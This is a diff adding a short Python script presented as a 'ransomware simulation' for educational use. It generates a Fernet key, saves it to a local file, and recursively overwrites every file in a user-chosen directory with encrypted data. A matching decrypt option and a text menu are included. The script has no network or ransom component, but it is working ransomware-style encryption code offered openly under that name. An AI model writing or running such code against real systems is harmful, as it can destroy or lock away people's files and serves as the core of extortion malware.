@@ -1,0 +1,60 @@
+# Ransomware Simulation in Python
+# DISCLAIMER: This code is for educational purposes only. Do not use maliciously.
+
+import os
+import cryptography
+from cryptography.fernet import Fernet
+
+# Generate a key for encryption
+def generate_key():
+    key = Fernet.generate_key()
+    with open("ransom_key.key", "wb") as key_file:
+        key_file.write(key)
+
+# Load the previously generated key
+def load_key():
+    return open("ransom_key.key", "rb").read()
+
+# Encrypt files in the specified directory
+def encrypt_files(directory, key):
+    fernet = Fernet(key)
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            file_path = os.path.join(root, file)
+            with open(file_path, "rb") as file_data:
+                original_data = file_data.read()
+            encrypted_data = fernet.encrypt(original_data)
+            with open(file_path, "wb") as file_data:
+                file_data.write(encrypted_data)
+
+# Decrypt files in the specified directory
+def decrypt_files(directory, key):
+    fernet = Fernet(key)
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            file_path = os.path.join(root, file)
+            with open(file_path, "rb") as file_data:
+                encrypted_data = file_data.read()
+            decrypted_data = fernet.decrypt(encrypted_data)
+            with open(file_path, "wb") as file_data:
+                file_data.write(decrypted_data)
+
+if __name__ == "__main__":
+    print("1. Generate Key\n2. Encrypt Files\n3. Decrypt Files")
+    choice = input("Select an option: ")
+
+    if choice == "1":
+        generate_key()
+        print("Key generated and saved as ransom_key.key")
+    elif choice == "2":
+        key = load_key()
+        target_directory = input("Enter the directory to encrypt: ")
+        encrypt_files(target_directory, key)
+        print("Files encrypted successfully.")
+    elif choice == "3":
+        key = load_key()
+        target_directory = input("Enter the directory to decrypt: ")
+        decrypt_files(target_directory, key)
+        print("Files decrypted successfully.")
+    else:
+        print("Invalid option.")
